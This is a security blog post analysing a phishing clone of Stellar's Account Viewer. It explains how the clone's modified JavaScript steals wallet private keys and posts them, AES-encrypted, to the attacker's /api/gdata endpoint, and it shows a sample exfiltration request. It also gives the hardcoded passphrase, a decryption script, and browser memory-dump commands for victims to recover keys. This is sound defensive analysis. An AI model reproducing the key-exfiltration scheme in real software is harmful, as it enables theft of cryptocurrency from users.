---
layout: post
title: XLM Account Viewer phishing
---

The following address: **hxxp://accountviewer.stellar.org.ge** is a malicious clone attacking stellar users.

It all starts with a phishing email:

{:refdef: style="text-align: center;"}
![_config.yml]({{ site.baseurl }}/images/xlm/phshing.jpg)
{: refdef}

Quickly checking the mail headers reveals suspicious details:

{:refdef: style="text-align: center;"}
![_config.yml]({{ site.baseurl }}/images/xlm/headers.png)
{: refdef}


The send is **no-reply@annfinance.co.uk**, which seems to be a legitimate company with records dating from at least 2016. This company however does not seems to have any link with Stellar whatsoever. It is plausible that their mail accounts have been compromised in order to perform phishing attacks.

The mail's body contains a link to Stellar's account viewer page, which looks exactly like the original, as it was probably forked using [AccountViewer v2](https://github.com/stellar/account-viewer-v2), except that the domain is stellar.org.ge instead of stellar.org:

| ![_config.yml]({{ site.baseurl }}/images/xlm/clone.png) | 
|:--:| 
| *Clone Website* |

| ![_config.yml]({{ site.baseurl }}/images/xlm/legit.png) | 
|:--:| 
| *Original Website* |


The TLS certificate is also not issued by the same CA, which is usually very fishy, especially if it comes from Let's Encrypt, as they are free, and easy to deploy:


| ![_config.yml]({{ site.baseurl }}/images/xlm/clonecert.png) | 
|:--:| 
| *Let's Encrypt clone certificate* |



| ![_config.yml]({{ site.baseurl }}/images/xlm/legitcert.png) | 
|:--:| 
| *Original Sectigo certificate* |


Even the domain's DNS records look nothing like the original Stellar's site, which is protected by Cloudflare:

{:refdef: style="text-align: center;"}
![_config.yml]({{ site.baseurl }}/images/xlm/dns.png)
{: refdef}

This is a pretty good indication that the two domains are not controlled by the same entity.

The page offers to create a wallet for sending XLM. After reading the modified Javascript code, we found out what it was doing:

* Wait until the wallet reaches 15k XLM
* Create a new private/public key pair using stellar sdk
* Trigger a wire transfer to the newly created wallet
* Save a transaction's history containing the **wallet's private key**

By sending the private key to **/api/gdata**, the rogue site ensures they keep their hands on all the accounts where the XLM has been transfered.

The source file responsible for the account creation can be found here:

{:refdef: style="text-align: center;"}
![_config.yml]({{ site.baseurl }}/images/xlm/sources.png)
{: refdef}

The algorithm generates a JSON payload of the following form:

```json
{"ffatale":"BLOBBLOB 97023.3555 => SCT62N4GYPBBTJCMGSHGEUTJNCXXCULPSYFFYAS6D5H62HD7SQF6RFZS"}
```

Then, the javascript source encrypts the json array using AES and a harcoded passphrase:

{:refdef: style="text-align: center;"}
![_config.yml]({{ site.baseurl }}/images/xlm/js.png)
{: refdef}

The request, as received by **/api/gdata** should look something like this:

```http
POST /api/gdata HTTP/1.1
Host: "accountviewer.stellar.org.ge
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.60 Safari/537.17
Accept-Encoding: gzip, deflate, br
Accept: application/json
Connection: keep-alive
Content-Type: application/json
Content-Length: 152

U2FsdGVkX1+uqjVGvPpGo9olPeF8kF2E24710Lrxv29L97NEwnBgjs4PTZYp/DZCxTwejlDV0ynYF+Q8ZAVaAediKyfVztZJbM/DBE+HvoV6Su0SEQJCBGNBTaVSfFx9FmqN+YxZv9eZkpLbR8H6kA==
```

## If you have NOT closed your browser, or rebooted your computer since the transaction was done

As the request containing the private key is sent from your browser, it **might** still reside somewhere in the process's memory. Using GDB on Mac or Linux, and ProcDump on Windows, it is possible to dump your browser's memory. Once that is done, look for specific strings that could match the request, like "/api/gdata", or "accountviewer.stellar.org.ge".

For instance, with Linux:

```bash
gcore -a <browser_pid>
strings core.bin|grep "/api/gdata"
```
Note that it is possible to dump the memory by tab, as they are forked into separate processes. If you want a cleaner memory dump, easier to parse, and you havent closed the tab where the transacation was made, you can go to ```about:config``` and get the PID of the specific tab. You can then proceed to dump it's memory and investigate it.


If you find the request containing the base64 encrypted data blob, **DO NOT** under any circumstance, communicate it to anyone (even us), in order to decrypt it. Instead, decrypt it with the following python program:

```python
from Cryptodome import Random
from Cryptodome.Cipher import AES
from hashlib import md5
import base64
import hashlib

def pad(data):
    length = BLOCK_SIZE - (len(data) % BLOCK_SIZE)
    return (data + (chr(length)*length)).encode()

def unpad(data):
    return data[:-(data[-1] if type(data[-1]) == int else ord(data[-1]))]

def bytes_to_key(data, salt, output=48):
    # extended from https://gist.github.com/gsakkis/4546068
    assert len(salt) == 8, len(salt)
    data += salt
    key = md5(data).digest()
    final_key = key
    while len(final_key) < output:
        key = md5(key + data).digest()
        final_key += key
    return final_key[:output]

def encrypt(message, passphrase):
    salt = Random.new().read(8)
    key_iv = bytes_to_key(passphrase, salt, 32+16)
    key = key_iv[:32]
    iv = key_iv[32:]
    aes = AES.new(key, AES.MODE_CBC, iv)
    return base64.b64encode(b"Salted__" + salt + aes.encrypt(pad(message)))

def decrypt(encrypted, passphrase):
    encrypted = base64.b64decode(encrypted)
    assert encrypted[0:8] == b"Salted__"
    salt = encrypted[8:16]
    key_iv = bytes_to_key(passphrase, salt, 32+16)
    key = key_iv[:32]
    iv = key_iv[32:]
    aes = AES.new(key, AES.MODE_CBC, iv)
    return unpad(aes.decrypt(encrypted[16:]))

if __name__=="__main__":
    BLOCK_SIZE = 16
    passphrase = "lomzarstiimissulilzinsomedayillcometouintheotherdimension".encode()
    cipher = 'your_base64_data'
    print(decrypt(cipher, passphrase))
```

Once you have the private key, you have control over the wallet, and you can recover your losses.

## If you have closed your browser, rebooted your computer, or used a phone:

It is very likely that it is very complicated, or impossible, to retrieve traces of the malicious destination wallet. In case the phone was rooted, there might be a chance by dumping the browser's memory using [LiME](https://github.com/504ensicsLabs/LiME).


### Links

https://www.xmodulo.com/find-process-id-chrome-browser-tab.html#:~:text=Alternatively%2C%20you%20can%20also%20press,each%20tab%20or%20active%20extension.
https://github.com/504ensicsLabs/LiME
https://stackoverflow.com/questions/36762098/how-to-decrypt-password-from-javascript-cryptojs-aes-encryptpassword-passphras
